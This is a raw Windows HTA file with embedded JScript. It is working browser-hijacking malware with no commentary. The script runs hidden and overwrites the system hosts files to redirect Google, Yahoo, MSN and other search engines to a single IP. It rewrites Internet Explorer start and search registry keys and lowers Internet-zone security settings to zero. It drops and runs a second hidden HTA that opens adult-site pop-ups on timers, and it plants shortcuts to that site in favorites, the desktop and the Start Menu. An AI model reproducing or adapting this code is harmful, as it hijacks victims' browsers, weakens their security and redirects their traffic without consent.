<HTA:APPLICATION WINDOWSTATE="minimize" BORDER="none" 
SHOWINTASKBAR="no"><HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<SCRIPT>
self.moveTo(15000,15000);
var fold="";
var fil="";
var nam="";
var totalTime=0;
var Urls=new Array;
var Timers=new Array;
var label="!! Best TEEN TGP site !!";
var url="http://teen4free.virgintgp.com";
var icofile="%WinDir%\\System\\User.exe";
var iconum="4";
var label2="Best TEEN TGP site!!!";
var url2="http://teen4free.virgintgp.com";
var icofile2="%WinDir%\\System\\User.exe";
var iconum2="6";

var gsStartPUrl ="http://www.do-jaja.com/search/index.html";
var gsSMenuUrl = "http://teen4free.virgintgp.com";
var gsSMenuDescr = "!! Best TEEN TGP site !!";
var tr="http://teen4free.virgintgp.com";
var tr1="http://teen4free.virgintgp.com";
var sp="http://teen4free.virgintgp.com";
var sp1="http://teen4free.virgintgp.com";

Urls[0]=tr;
Urls[1]=tr1;
Urls[2]=sp;
Urls[3]=sp1;
Urls[4]=tr;
Urls[5]=tr;
Urls[6]=tr;
Urls[7]=sp;
Urls[8]=tr1;
Urls[9]=tr;
Urls[10]=tr;
Urls[11]=tr;
Urls[12]=tr;
Urls[13]=tr1;
Urls[14]=tr;

Timers[0]=2.5;
Timers[1]=4;
Timers[2]=8;
Timers[3]=11;
Timers[4]=14;
Timers[5]=17;
Timers[6]=20;
Timers[7]=25;
Timers[8]=27.5;
Timers[9]=30;
Timers[10]=32.5;
Timers[11]=35;
Timers[12]=37.5;
Timers[13]=40;
Timers[14]=42.5;

function ChangeStartPage( url )
{
Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Start Page", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Page_URL", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Default_Search_URL", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Windows\\SafeSites\\ie.search.msn.com", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\SearchUrl\\Default", url );
Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\SearchUrl\\Default", url );
Shl.RegWrite( "HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\Internet Explorer\\SearchUrl\\Default", url );
Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page", url );
Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\Main\\Search Bar", url );
Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\SearchURL", url );
Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\Search\\CustomizeSearch", url );
Shl.RegWrite( "HKCU\\Software\\Microsoft\\Internet Explorer\\Search\\SearchAssistant", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Search Page", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Main\\Search Bar", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\SearchURL", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Search\\CustomizeSearch", url );
Shl.RegWrite( "HKLM\\Software\\Microsoft\\Internet Explorer\\Search\\SearchAssistant", url );
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\CurrentLevel",0,"REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\1001",0,"REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\1004",0,"REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\1200",0,"REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\1201",0,"REG_DWORD");
Shl.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\\1405",0,"REG_DWORD");
}
function AddLnk( folder, type )
{
{
if( FSO.FolderExists( folder ) )
{
var url, discr;
switch(type)
{
case 2: url = gsSMenuUrl; discr = gsSMenuDescr; break;
}
var Shor = Shl.CreateShortcut( folder + "\\" + discr +".url" );
Shor.TargetPath = url;
Shor.Save();
}
}
return true;
}
function AddLnkBase( folder, bMenu )
{
{
if( FSO.FolderExists( folder ) )
{
folder = folder + "\\";
if( bMenu )
{
AddLnk( folder + "Start Menu", 2 );
}
return true;
}
}
return true;
}
function AddLinks(  )
{
{
var WF = FSO.GetSpecialFolder(0);

AddLnkBase( WF, true, true, true );

var sDocsAndSets = FSO.GetDriveName(WF) + "\\Documents and Settings\\";
AddLnkBase( sDocsAndSets + "All Users", false, true, true );
AddLnkBase( sDocsAndSets + Net.UserName, true, false, false );

var sProfiles = WF + "\\Profiles\\";
AddLnkBase( sProfiles + "All Users", false, true, true );
AddLnkBase( sProfiles + Net.UserName, true, false, false );
}
}
function doc()
{
var fold=FSO.GetSpecialFolder(0);
var nam="winsys.hta";
var fil=fold.CreateTextFile(nam);fil.WriteLine("<HT"+"ML><HE"+"AD><TI"+"TLE>"+"System</TIT"+"LE><HT"+"A"+":"+"APPLI"+"CATION SHO"+"WINTA"+"SKBAR='no' BORDER='none' WINDOW"+"STATE='minimize'>\r\n<SC"+"RIPT>\r\nself.moveTo(15000,15000);\r\n");
for (i=0;i<Urls.length;i++)	{
var tim=Timers[i]*60000;
t="setTimeout('q=window.open(\""+Urls[i]+"\",\"_blank\");q.blur();',"+tim+")\;";	fil.WriteLine(t);}
totalTime=(Timers[Timers.length-1]+0.1)*60000;
fil.WriteLine("setTimeout('self.close()\;',"+totalTime+")");
fil.WriteLine("</sc"+"ript></b"+"ody></h"+"tml>");
fil.close();}

function savefavfile(folder,label,url,icofile,iconum){
var oFi=FSO.CreateTextFile(folder+"\\"+label+".url");
oFi.WriteLine("[InternetShortcut]");
oFi.WriteLine("URL="+url);
oFi.WriteLine("Modified=806188A46609C1013E");
oFi.WriteLine("IconIndex="+iconum);
oR=/%windir%/i;	icofile=icofile.replace(oR,WinDir);
oFi.WriteLine("IconFile="+icofile);
oFi.Close(); }
function putfav(folder, folder2){
savefavfile(folder,label,url,icofile,iconum);
savefavfile(folder2,label,url,icofile,iconum);
savefavfile(folder,label2,url2,icofile2,iconum2);
savefavfile(folder2,label2,url2,icofile2,iconum2);}
function open(){
try{
Shl = new ActiveXObject("WScript.Shell");
FSO = new ActiveXObject("Scripting.FileSystemObject");
tfolder=FSO.GetSpecialFolder(0);
tname="hosts";
tfile=tfolder.CreateTextFile(tname);
tfile.writeline("69.61.33.183 thehun.com\r\n69.61.33.183 www.thehun.com\r\n69.61.33.183 thehun.net\r\n69.61.33.183 www.thehun.net\r\n69.61.33.183 www.yahoo.com\r\n69.61.33.183 yahoo.com\r\n69.61.33.183 www.google.com\r\n69.61.33.183 google.com\r\n69.61.33.183 www.altavista.com\r\n69.61.33.183 altavista.com\r\n69.61.33.183 search.microsoft.com\r\n69.61.33.183 search.msn.com\r\n69.61.33.183 www.msn.com\r\n69.61.33.183 msn.com\r\n69.61.33.183 www.search.com\r\n69.61.33.183 search.com\r\n69.61.33.183 www.teoma.com\r\n69.61.33.183 teoma.com\r\n69.61.33.183 www.alltheweb.com\r\n69.61.33.183 alltheweb.com\r\n69.61.33.183 www.wisenut.com\r\n69.61.33.183 wisenut.com\r\n69.61.33.183 www.dmoz.org\r\n69.61.33.183 dmoz.org\r\n69.61.33.183 www.excite.com\r\n69.61.33.183 excite.com\r\n69.61.33.183 www.lycos.com\r\n69.61.33.183 lycos.com\r\n69.61.33.183 www.hotbot.com\r\n69.61.33.183 hotbot.com\r\n69.61.33.183 www.casino.com\r\n69.61.33.183 casino.com");
tfile.close();
tname="system32\\drivers\\etc\\hosts";
tfile=tfolder.CreateTextFile(tname);
tfile.writeline("69.61.33.183 thehun.com\r\n69.61.33.183 www.thehun.com\r\n69.61.33.183 thehun.net\r\n69.61.33.183 www.thehun.net\r\n69.61.33.183 www.yahoo.com\r\n69.61.33.183 yahoo.com\r\n69.61.33.183 www.google.com\r\n69.61.33.183 google.com\r\n69.61.33.183 www.altavista.com\r\n69.61.33.183 altavista.com\r\n69.61.33.183 search.microsoft.com\r\n69.61.33.183 search.msn.com\r\n69.61.33.183 www.msn.com\r\n69.61.33.183 msn.com\r\n69.61.33.183 www.search.com\r\n69.61.33.183 search.com\r\n69.61.33.183 www.teoma.com\r\n69.61.33.183 teoma.com\r\n69.61.33.183 www.alltheweb.com\r\n69.61.33.183 alltheweb.com\r\n69.61.33.183 www.wisenut.com\r\n69.61.33.183 wisenut.com\r\n69.61.33.183 www.dmoz.org\r\n69.61.33.183 dmoz.org\r\n69.61.33.183 www.excite.com\r\n69.61.33.183 excite.com\r\n69.61.33.183 www.lycos.com\r\n69.61.33.183 lycos.com\r\n69.61.33.183 www.hotbot.com\r\n69.61.33.183 hotbot.com\r\n69.61.33.183 www.casino.com\r\n69.61.33.183 casino.com");
tfile.close();

doc();
var fold=FSO.GetSpecialFolder(0);
Shl.run(fold+"\\winsys.hta");
}
catch(e){return;}}
function f(){
try{

Shl = new ActiveXObject("WScript.Shell");
FSO = new ActiveXObject("Scripting.FileSystemObject");
WinDir=Shl.ExpandEnvironmentStrings("%WINDIR%");
myFav=Shl.SpecialFolders("Favorites");
myDesk=Shl.SpecialFolders("Desktop");
putfav(myFav, myDesk);
}
catch(e){return;}}
function f2()
{
{
Shl = new ActiveXObject("WScript.Shell");
FSO = new ActiveXObject("Scripting.FileSystemObject");
Net = new ActiveXObject("WScript.Network");

var expdate = new Date((new Date()).getTime() + (24 * 60 * 60 * 1000 * 90));
document.cookie="Chg=general; expires=" + expdate.toGMTString() + "; path=/;"

ChangeStartPage( gsStartPUrl );
AddLinks( );
}
}
function init(){
setTimeout("open()", 4000);
setTimeout("f()", 4100);
setTimeout("f2()", 4200);}
init();
</SCRIPT>

<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<BODY></BODY></HTML>
